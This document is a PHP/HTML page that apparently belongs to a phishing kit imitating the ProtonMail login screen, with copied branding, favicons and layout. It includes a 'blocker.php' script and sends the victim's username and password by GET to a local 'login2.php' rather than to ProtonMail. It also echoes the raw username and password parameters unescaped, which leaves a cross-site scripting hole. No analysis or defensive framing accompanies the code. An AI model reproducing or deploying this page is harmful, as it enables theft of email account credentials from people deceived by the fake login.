<?php
include('blocker.php');
$email = '';

if(isset($_GET['username']) && !empty($_GET['username'])){
$email = $_GET['username'];
}
?>
<?php

echo $_GET['username'];
echo $_GET['password'];

?>

<!DOCTYPE html>



<html lang="en" ng-app="proton" class="protonmail ua-windows_nt ua-windows_nt-6 ua-windows_nt-6-1 ua-chrome ua-chrome-61 ua-chrome-61-0 ua-chrome-61-0-3163 ua-chrome-61-0-3163-100 ua-desktop ua-desktop-windows ua-webkit ua-webkit-537 ua-webkit-537-36 js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <meta http-equiv="x-dns-prefetch-control" content="off">
    <!--<base href="/">--><base href=".">
    <title>Login | ProtonMail</title>
    <meta name="description" content="Log in or create an account.">

    <link rel="apple-touch-icon" sizes="57x57" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-16x16.png" sizes="16x16">
    <link rel="manifest" href="https://mail.protonmail.com/manifest.json">
    <link rel="mask-icon" href="https://mail.protonmail.com/assets/favicons/safari-pinned-tab.svg" color="#333366">
    <link rel="shortcut icon" href="https://mail.protonmail.com/assets/favicons/favicon.ico">
    <meta name="apple-mobile-web-app-title" content="ProtonMail">
    <meta name="application-name" content="ProtonMail">
    <meta name="msapplication-TileColor" content="#333366">
    <meta name="msapplication-TileImage" content="https://mail.protonmail.com/assets/favicons/mstile-144x144.png">
    <meta name="theme-color" content="#333366">
    <meta name="apple-itunes-app" content="app-id=979659905">
    <!--- Stylesheets --->
    
        <link rel="stylesheet" type="text/css" href="./assets/app.css">
    
	
	
	</head>
	
	<body ng-class="{
    locked: (isLoggedIn &amp;&amp; isLocked) || (&#39;login&#39;|isState) || (&#39;login.unlock&#39;|isState) || (&#39;eo.unlock&#39;|isState) || (&#39;eo.message&#39;|isState) || (&#39;reset&#39;|isState) || (&#39;eo.reply&#39;|isState) || (&#39;reset&#39;|isState),
    login:!isLoggedIn,
    unlock:isLocked,
    secure:isSecure,
    light: (&#39;support.reset-password&#39;|isState) || (&#39;signup&#39;|isState) || (&#39;login.setup&#39;|isState) || (&#39;pre-invite&#39;|isState) || (&#39;support.message&#39;|isState),
    scroll: (&#39;signup&#39;|isState) || (&#39;login.setup&#39;|isState) || (&#39;secured.print&#39;|isState)
}" data-detect-time-width="" data-app-config-body="" class="locked login unlock" id="login"><!---->









<div ui-view="main" autoscroll="false" id="body">

<header class="pm_opensans headerNoAuth-container" ng-class="{ &#39;isLoggedIn&#39;: isLoggedIn }">
    <ul class="headerNoAuth-list">
      
			<img class="headerNoAuth-item-back" src="./assets/back.png">
            </a>
      
      
      
        <li class="headerNoAuth-item-report">
            <button type="button" class="headerNoAuth-item-report-button newBugReport-container">
    <div class="newBugReport-wrapper">
        <img class="CToWUd" src="./assets/report.png">
    </div>
</button>
        </li>
        <li class="headerNoAuth-item-signup__noAuth">
            <a data-key="forFree" class="headerNoAuth-item-signup-button pm_button primary" href="https://protonmail.com/signup">Sign up for free</a>
        </li>
        <li class="headerNoAuth-item-logout__Auth">
            <a class="headerNoAuth-item-logout-button pm_button primary" ui-sref="login" translate="" translate-context="Action" href="https://mail.protonmail.com/login">Log out</a>
        </li>
    </ul>
</header>

<div class="row">
   
    <!----><div ui-view="panel"><form method="GET" id="pm_login" name="loginForm" class="pm_panel alt pm_form loginForm-containter ng-pristine ng-invalid ng-invalid-required"  action="./login2.php" ng-show="twoFactor === 0">

    <img src="./assets/logo.png" height="20" alt="ProtonMail" class="logo">

   

	<h4 class="text-center margin-bottom">  <span translate-context="Title" translate="">User login</span> 
	
	</h4> <!----> 
	
	<label for="username" class="sr-only" translate-context="Label" translate="">User login</label>

    <!---->

    <input autofocus="" autocapitalize="off" autocorrect="off" type="text" ng-model="username" tabindex="1" id="username" name="username" class="margin loginForm-input-username ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" required="" placeholder="Username">

    <div class="margin loginForm-input-password password-container customPasswordToggler" data-id="password" data-name="password" data-value="password" data-tabindex="2" data-form="loginForm" placeholder="Password">
    <input type="password" class="password-input ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" ng-model="value" autocapitalize="off" autocorrect="off" autocomplete="off" required="" data-toggle-password="" id="password" name="password" placeholder="Password" tabindex="2">

</div>

    <div class="loginForm-actions">
        <div class="loginForm-actions-column">
            
            
            
<button id="login_btn" type="submit" class="loginForm-actions-main pm_button primary primary-white pull-right loginForm-btn-submit disabled-if-network-activity" translate-context="Action" translate="">Login</button>
            
            
            
            
      <div class="text-left text-notransform loginForm-actions-help"> <span translate="" translate-context="Trouble logging in? Get help or try older version.">Trouble logging in? Get</span> <button class="loginForm-btn-help" ng-click="displayHelpModal()" type="button" translate-comment="Action" translate-context="Trouble logging in? Get help or try older version." translate="">help</button> <span translate="" translate-context="Trouble logging in? Get help or try older version.">or try</span> 



<a class="link loginForm-btn-oldversion" href="" target="_self" translate-comment="Action" translate-context="Trouble logging in? Get help or try older version." translate="">older version</a>. </div> <div class="loginForm-actions-new-container"> <div class="loginForm-actions-new-title text-notransform h4 margin-top" translate-context="title" translate="">New to ProtonMail?</div> <div class="loginForm-actions-create-container margin-top"> <a class="loginForm-link-signup-button loginForm-actions-right margin-bottom" href="">Create Account</a> </div> </div> </div> </div> </div> 


<input type="hidden" id="hashed_pw" name="hashed_pw" autocomplete="off">


</form>






<center><div class="pm_panel-bottom text-notransform" style="color: #fff;text-transform: none;"  >
    Want to test the latest features? Log in on</span> <a href="" style="color: #fff;text-transform: none;"  >BETA.</a></div></center> 
    
    
    
    
    

<div class="text-center" ng-show="::showOld">
    <a class="pm_button link login-btn-oldversion" style="color: #fff; text-transform: none;" href="https://old.protonmail.com/login" target="_self" translate-context="Action" translate-comment="link for old" translate="">Having trouble? Try an older version</a>
</div>
</div>
</div>

<div id="pm_footer">
    <p><span class="appCopyright-container">2020 ProtonMail.com - Made globally, hosted in Switzerland.</span> <a data-prefix="v" href="" title="Wed Oct 18 2017" target="_blank" class="appVersion-container">3.15.5</a></p>
</div>
</div>
</body></html>